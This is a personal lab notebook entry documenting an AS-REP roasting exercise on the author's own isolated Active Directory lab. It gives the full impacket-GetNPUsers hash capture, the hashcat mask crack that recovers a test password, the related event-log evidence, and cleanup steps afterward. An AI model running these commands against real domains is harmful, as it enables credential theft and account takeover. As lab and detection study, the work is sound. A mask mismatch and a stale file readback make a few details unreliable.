@@ -1,0 +1,472 @@
+2026-09-13: AS-REP roasting scenario
+
+i will use nat temporarily to install `impacket` and `hashcat` just like the `smbclient` installation.
+
+set `KALI01` vm adapter to `VMNet8 (NAT)`.
+
+activate the saved maintenance profile:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ sudo nmcli connection up "KALI01-NAT-Maintenance"
+Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/4)
+```
+
+update package list:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ sudo apt update
+```
+
+install `impacket` and `hashcat`:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ sudo apt install impacket-scripts hashcat
+```
+verify:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ impacket-GetNPUsers -h
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+┌──(jerry㉿kali01)-[~]
+└─$ hashcat --version
+v7.1.2
+```
+
+check which processing devices `hashcat` detects:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ hashcat -I            
+hashcat (v7.1.2) starting in backend information mode
+
+OpenCL Info:
+============
+
+OpenCL Platform ID #1
+  Vendor..: The pocl project
+  Name....: Portable Computing Language
+  Version.: OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG
+
+  Backend Device ID #01
+    Type...........: CPU
+    Vendor.ID......: 1
+    Vendor.........: AuthenticAMD
+    Name...........: cpu-haswell-AMD Ryzen 7 7735HS with Radeon Graphics
+    Version........: OpenCL 3.0 PoCL HSTR: cpu-x86_64-pc-linux-gnu-haswell
+    Processor(s)...: 2
+    Preferred.Thrd.: 1
+    Clock..........: 3193
+    Memory.Total...: 2909 MB (limited to 1454 MB allocatable in one block)
+    Memory.Free....: 1454 MB
+    Memory.Unified.: 1
+    Local.Memory...: 512 KB
+    OpenCL.Version.: OpenCL C 1.2 PoCL
+    Driver.Version.: 7.1+debian
+```
+hashcat detects a cpu device with two processors available.
+
+tools are installed, switch `KALI01` to Host-only again in vmware.
+
+activate original lab profile:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ sudo nmcli connection up "Wired connection 1"
+Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/6)
+```
+verify:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ nmcli
+eth0: connected to Wired connection 1
+        "Intel 82545EM"
+        ethernet (e1000), 00:0C:29:C7:E5:84, hw, mtu 1500
+        inet4 192.168.190.11/24
+        route4 192.168.190.0/24 metric 100
+        inet6 fe80::20c:29ff:fec7:e584/64
+        route6 fe80::/64 metric 1024
+
+lo: connected (externally) to lo
+        "lo"
+        loopback (unknown), 00:00:00:00:00:00, sw, mtu 65536
+        inet4 127.0.0.1/8
+        inet6 ::1/128
+
+DNS configuration:
+        servers: 192.168.190.10
+        interface: eth0
+
+Use "nmcli device show" to get complete information about known devices and
+"nmcli connection show" to get an overview on active connection profiles.
+
+Consult nmcli(1) and nmcli-examples(7) manual pages for complete usage details.
+
+┌──(jerry㉿kali01)-[~]
+└─$ ip route get 8.8.8.8
+RTNETLINK answers: Network is unreachable
+```
+
+check account-management auditing:
+```
+PS C:\Users\Administrator> auditpol /get /subcategory:"User Account Management"
+System audit policy
+Category/Subcategory                      Setting
+Account Management
+  User Account Management                 Success
+```
+
+check kerberos authentication auditing:
+```
+PS C:\Users\Administrator> auditpol /get /subcategory:"Kerberos Authentication Service"
+System audit policy
+Category/Subcategory                      Setting
+Account Logon
+  Kerberos Authentication Service         Success and Failure
+```
+
+prepare the dedicated test account, `asrep-test`.
+
+check for an existing user with that name:
+```
+PS C:\Users\Administrator> Get-ADUser -Filter 'SamAccountName -eq "asrep-test"' | Select-Object Name,SamAccountName,DistinguishedName
+```
+no matching user was found.
+
+read the domain's password requirements:
+```
+PS C:\Users\Administrator> Get-ADDefaultDomainPasswordPolicy -Identity "ad.pearsonspecterlitt.com" | Select-Object MinPasswordLength,ComplexityEnabled
+
+MinPasswordLength ComplexityEnabled
+----------------- -----------------
+                7              True
+```
+
+`asrep-test`'s password is going to be four digits followed by `Aa!`. this satisfies the length and complexity requirements and limits the later controlled test into 10,000 candidates.
+
+enter the password as secure string:
+```
+PS C:\Users\Administrator> $asrepPassword = Read-Host "Temporary password for asrep-test" -AsSecureString
+Temporary password for asrep-test: *******
+```
+
+create the account in the domain's default user container, whose path is obtained from `Get-ADDomain`:
+```
+PS C:\Users\Administrator> New-ADUser -Name "asrep-test" -SamAccountName "asrep-test" -UserPrincipalName "asrep-test@ad.pearsonspecterlitt.com" -Path (Get-ADDomain -Identity "ad.pearsonspecterlitt.com").UsersContainer -AccountPassword $asrepPassword -Enabled $true -ChangePasswordAtLogon $false -Description "Dedicated AS-REP roasting lab test account" -ErrorAction Stop
+```
+this enables the account with the supplied password.
+
+verify:
+```
+PS C:\Users\Administrator> Get-ADUser -Identity "asrep-test" -Properties DoesNotRequirePreAuth | Select-Object SamAccountName,Enabled,DoesNotRequirePreAuth,DistinguishedName | Format-List
+
+
+SamAccountName        : asrep-test
+Enabled               : True
+DoesNotRequirePreAuth : False
+DistinguishedName     : CN=asrep-test,CN=Users,DC=ad,DC=pearsonspecterlitt,DC=com
+```
+kerberos preauthentication is required.
+
+test kerberos preauthentication in `KALI01`:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ impacket-GetNPUsers "ad.pearsonspecterlitt.com/asrep-test" -dc-ip 192.168.190.10 -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for asrep-test
+[-] User asrep-test doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+the setting that permits bypassing preauthentication is off, matching `DoesNotRequirePreAuth : False`.
+
+disable preauthentication for `asrep-test`:
+```
+PS C:\Users\Administrator> Set-ADAccountControl -Identity "asrep-test" -DoesNotRequirePreAuth $true -ErrorAction Stop
+```
+verify:
+```
+PS C:\Users\Administrator> Get-ADUser -Identity "asrep-test" -Properties DoesNotRequirePreAuth | Select-Object SamAccountName,Enabled,DoesNotRequirePreAuth,DistinguishedName | Format-List
+
+
+SamAccountName        : asrep-test
+Enabled               : True
+DoesNotRequirePreAuth : True
+DistinguishedName     : CN=asrep-test,CN=Users,DC=ad,DC=pearsonspecterlitt,DC=com
+```
+
+collect event `4738`:
+```
+PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName="Security";Id=4738;StartTime=(Get-Date).AddMinutes(-30)} | Where-Object {$_.Message -match '\basrep-test\b'} | Select-Object -First 1 TimeCreated,Id,RecordId,MachineName,KeywordsDisplayNames,Message | Format-List
+
+
+TimeCreated          : 9/13/2026 6:09:02 PM
+Id                   : 4738
+RecordId             : 74614
+MachineName          : DC01.ad.pearsonspecterlitt.com
+KeywordsDisplayNames : {Audit Success}
+Message              : A user account was changed.
+
+                       Subject:
+                        Security ID:            S-1-5-21-1881315258-3822834566-1441680494-500
+                        Account Name:           Administrator
+                        Account Domain:         PSL
+                        Logon ID:               0x81738
+
+                       Target Account:
+                        Security ID:            S-1-5-21-1881315258-3822834566-1441680494-1115
+                        Account Name:           asrep-test
+                        Account Domain:         PSL
+
+                       Changed Attributes:
+                        SAM Account Name:       -
+                        Display Name:           -
+                        User Principal Name:    -
+                        Home Directory:         -
+                        Home Drive:             -
+                        Script Path:            -
+                        Profile Path:           -
+                        User Workstations:      -
+                        Password Last Set:      -
+                        Account Expires:                -
+                        Primary Group ID:       -
+                        AllowedToDelegateTo:    -
+                        Old UAC Value:          0x10
+                        New UAC Value:          0x10010
+                        User Account Control:
+                                'Don't Require Preauth' - Enabled
+                        User Parameters:        -
+                        SID History:            -
+                        Logon Hours:            -
+
+                       Additional Information:
+                        Privileges:             -
+```
+uac `Don't Require Preauth` is `Enabled`.
+
+preserve `asrep-test`'s as rep hash:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ impacket-GetNPUsers "ad.pearsonspecterlitt.com/asrep-test" -dc-ip 192.168.190.10 -no-pass -format hashcat -outputfile asrep-test.asrep > asrep-test-request.txt 2>&1
+                                                                                                                                                                    
+┌──(jerry㉿kali01)-[~]
+└─$ cat asrep-test.asrep
+$krb5asrep$18$asrep-test$AD.PEARSONSPECTERLITT.COM$08bdf2ce3e4ad3da14bbef6f$d5c88f1a3cac371cd2fb2695bbd25537b571e649e431753c7b94c0e29e90f84b7b8a0a35b03cfb72eda2bc6fd3090f180ba9ad013a3bf3fccb52bd947fbe689e5ff63b8ce313075cb5f240735a3c647824e00288bd5994732816d5ed35c93c703420ac924932309e0c087c201da6693e95830479dfb0199c7da8e4beb0eb3da043528e4fbd78c1e35a433f1f29e133efb7deafbd3106dec2b787b3d1682ec25246a2922e66091ced105f1ab1b77d6f4f9d7753f6a98abaf0f6d0ab69d02194300cc7b2c911d3666fe453defd991c0022b2f6a83c8034fc95009fe696f357658ebf7e23f362a4381f71c1d2f8ec5ba506324f7817dd2fe007e146e0be5b7dff8d0d99df16629a907e11bcb288d633
+                                                                                                                                                                    
+┌──(jerry㉿kali01)-[~]
+└─$ cat asrep-test-request.txt
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for asrep-test
+$krb5asrep$18$asrep-test$AD.PEARSONSPECTERLITT.COM$08bdf2ce3e4ad3da14bbef6f$d5c88f1a3cac371cd2fb2695bbd25537b571e649e431753c7b94c0e29e90f84b7b8a0a35b03cfb72eda2bc6fd3090f180ba9ad013a3bf3fccb52bd947fbe689e5ff63b8ce313075cb5f240735a3c647824e00288bd5994732816d5ed35c93c703420ac924932309e0c087c201da6693e95830479dfb0199c7da8e4beb0eb3da043528e4fbd78c1e35a433f1f29e133efb7deafbd3106dec2b787b3d1682ec25246a2922e66091ced105f1ab1b77d6f4f9d7753f6a98abaf0f6d0ab69d02194300cc7b2c911d3666fe453defd991c0022b2f6a83c8034fc95009fe696f357658ebf7e23f362a4381f71c1d2f8ec5ba506324f7817dd2fe007e146e0be5b7dff8d0d99df16629a907e11bcb288d633
+```
+prefix is `$krb5asrep$18$`. which is kerberos 5, etype 18, as-rep (see https://hashcat.net/wiki/doku.php?id=hashcat).
+
+get event `4768`:
+```
+PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName="Security";Id=4768;StartTime=(Get-Date).AddMinutes(-30)} | Where-Object {$_.Message -match '\basrep-test\b'} | Select-Object -First 1 TimeCreated,Id,RecordId,MachineName,KeywordsDisplayNames,Message | Format-List
+
+
+TimeCreated          : 9/13/2026 7:54:52 PM
+Id                   : 4768
+RecordId             : 75541
+MachineName          : DC01.ad.pearsonspecterlitt.com
+KeywordsDisplayNames : {Audit Success}
+Message              : A Kerberos authentication ticket (TGT) was requested.
+
+                       Account Information:
+                        Account Name:           asrep-test
+                        Supplied Realm Name:    AD.PEARSONSPECTERLITT.COM
+                        User ID:                        S-1-5-21-1881315258-3822834566-1441680494-1115
+                        MSDS-SupportedEncryptionTypes:  0x0 (N/A)
+                        Available Keys: RC4, AES128-SHA96, AES256-SHA96, AES128-SHA256, AES256-SHA384
+
+                       Service Information:
+                        Service Name:           krbtgt
+                        Service ID:             S-1-5-21-1881315258-3822834566-1441680494-502
+                        MSDS-SupportedEncryptionTypes:  0x0 (N/A)
+                        Available Keys: RC4, AES128-SHA96, AES256-SHA96
+
+                       Domain Controller Information:
+                        MSDS-SupportedEncryptionTypes:  0x0 (N/A)
+                        Available Keys: RC4, AES128-SHA96, AES256-SHA96
+
+                       Network Information:
+                        Client Address:         ::ffff:192.168.190.11
+                        Client Port:            36576
+                        Advertized Etypes:
+                                RC4-HMAC-NT
+
+                       Additional Information:
+                        Ticket Options:         0x50800000
+                        Result Code:            0x0
+                        Ticket Encryption Type: 0x17
+                        Session Encryption Type:        0x17
+                        Pre-Authentication Type:        0
+                        Pre-Authentication EncryptionType:      0x0
+
+                       Certificate Information:
+                        Certificate Issuer Name:
+                        Certificate Serial Number:
+                        Certificate Thumbprint:
+
+                       Ticket information
+                        Response ticket hash:           9tG2lPkwGXmZOJD0RQrIwtgNKNBCCdT3sYVTKeupYIQ=
+
+                       Certificate information is only provided if a certificate was used for pre-authentication.
+
+                       Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
+```
+
+brute force the password hash using hashcat mode 32200:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ hashcat -m 32200 -a 3 asrep-test.asrep '?d?d?dAa!'
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 7735HS with Radeon Graphics, 1454/2909 MB (1454 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Brute-Force
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 512 MB (1774 MB free)
+
+$krb5asrep$18$asrep-test$AD.PEARSONSPECTERLITT.COM$08bdf2ce3e4ad3da14bbef6f$d5c88f1a3cac371cd2fb2695bbd25537b571e649e431753c7b94c0e29e90f84b7b8a0a35b03cfb72eda2bc6fd3090f180ba9ad013a3bf3fccb52bd947fbe689e5ff63b8ce313075cb5f240735a3c647824e00288bd5994732816d5ed35c93c703420ac924932309e0c087c201da6693e95830479dfb0199c7da8e4beb0eb3da043528e4fbd78c1e35a433f1f29e133efb7deafbd3106dec2b787b3d1682ec25246a2922e66091ced105f1ab1b77d6f4f9d7753f6a98abaf0f6d0ab69d02194300cc7b2c911d3666fe453defd991c0022b2f6a83c8034fc95009fe696f357658ebf7e23f362a4381f71c1d2f8ec5ba506324f7817dd2fe007e146e0be5b7dff8d0d99df16629a907e11bcb288d633:7680Aa!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 32200 (Kerberos 5, etype 18, AS-REP)
+Hash.Target......: $krb5asrep$18$asrep-test$AD.PEARSONSPECTERLITT.COM$...88d633
+Time.Started.....: Sun Sep 13 20:13:19 2026 (1 sec)
+Time.Estimated...: Sun Sep 13 20:13:20 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Mask.......: ?d?d?d?dAa! [7]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:     7655 H/s (12.93ms) @ Accel:218 Loops:1024 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8284/10000 (82.84%)
+Rejected.........: 0/8284 (0.00%)
+Restore.Point....: 436/1000 (43.60%)
+Restore.Sub.#01..: Salt:0 Amplifier:8-9 Iteration:3072-4095
+Candidate.Engine.: Device Generator
+Candidates.#01...: 7433Aa! -> 7198Aa!
+Hardware.Mon.#01.: Util: 95%
+
+Started: Sun Sep 13 20:12:51 2026
+Stopped: Sun Sep 13 20:13:21 2026
+```
+mask: each `?d` tries digits 0-9. with `Aa!` as the suffix.
+the password is `Cracked` which is `7680Aa!`.
+
+restore `asrep-test`'s preauth:
+```
+PS C:\Users\Administrator> Set-ADAccountControl -Identity "asrep-test" -DoesNotRequirePreAuth $false -ErrorAction Stop
+```
+verify:
+```
+PS C:\Users\Administrator> Get-ADUser -Identity "asrep-test" -Properties DoesNotRequirePreAuth | Select-Object SamAccountName,Enabled,DoesNotRequirePreAuth
+
+SamAccountName Enabled DoesNotRequirePreAuth
+-------------- ------- ---------------------
+asrep-test        True                 False
+
+PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{LogName="Security";Id=4738;StartTime=(Get-Date).AddMinutes(-30)} | Where-Object {$_.Message -match '\basrep-test\b'} | Select-Object -First 1 TimeCreated,Id,RecordId,MachineName,KeywordsDisplayNames,Message | Format-List
+
+
+TimeCreated          : 9/13/2026 8:20:14 PM
+Id                   : 4738
+RecordId             : 75818
+MachineName          : DC01.ad.pearsonspecterlitt.com
+KeywordsDisplayNames : {Audit Success}
+Message              : A user account was changed.
+
+                       Subject:
+                        Security ID:            S-1-5-21-1881315258-3822834566-1441680494-500
+                        Account Name:           Administrator
+                        Account Domain:         PSL
+                        Logon ID:               0x81738
+
+                       Target Account:
+                        Security ID:            S-1-5-21-1881315258-3822834566-1441680494-1115
+                        Account Name:           asrep-test
+                        Account Domain:         PSL
+
+                       Changed Attributes:
+                        SAM Account Name:       -
+                        Display Name:           -
+                        User Principal Name:    -
+                        Home Directory:         -
+                        Home Drive:             -
+                        Script Path:            -
+                        Profile Path:           -
+                        User Workstations:      -
+                        Password Last Set:      -
+                        Account Expires:                -
+                        Primary Group ID:       -
+                        AllowedToDelegateTo:    -
+                        Old UAC Value:          0x10010
+                        New UAC Value:          0x10
+                        User Account Control:
+                                'Don't Require Preauth' - Disabled
+                        User Parameters:        -
+                        SID History:            -
+                        Logon Hours:            -
+
+                       Additional Information:
+                        Privileges:             -
+```
+
+test kerberos preauthentication in `KALI01` again:
+```KALI01
+┌──(jerry㉿kali01)-[~]
+└─$ cat asrep-test-request.txt
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for asrep-test
+[-] User asrep-test doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+preauthentication is required again, and the request produces no fresh as rep material.
+
+reset `asrep-test`'s password:
+```
+PS C:\Users\Administrator> $newPassword = Read-Host "New password for asrep-test" -AsSecureString; Set-ADAccountPassword -Identity "asrep-test" -Reset -NewPassword $newPassword -ErrorAction Stop
+New password for asrep-test: *******
+```
+verify:
+```
+PS C:\Users\Administrator> Get-ADUser "asrep-test" -Properties PasswordLastSet,DoesNotRequirePreAuth | Select-Object SamAccountName,Enabled,PasswordLastSet,DoesNotRequirePreAuth
+
+SamAccountName Enabled PasswordLastSet      DoesNotRequirePreAuth
+-------------- ------- ---------------      ---------------------
+asrep-test        True 9/13/2026 8:33:14 PM                 False
+```
+
+disable `asrep-test`:
+```
+PS C:\Users\Administrator> Disable-ADAccount -Identity "asrep-test" -ErrorAction Stop
+```
+verify:
+```
+PS C:\Users\Administrator> Get-ADUser "asrep-test" -Properties DoesNotRequirePreAuth | Select-Object SamAccountName,Enabled
+
+SamAccountName Enabled
+-------------- -------
+asrep-test       False
+```
+
+what's next:
+1. inspect the local Administrators group on `WS01` to prepare the excessive local-administrator rights scenario
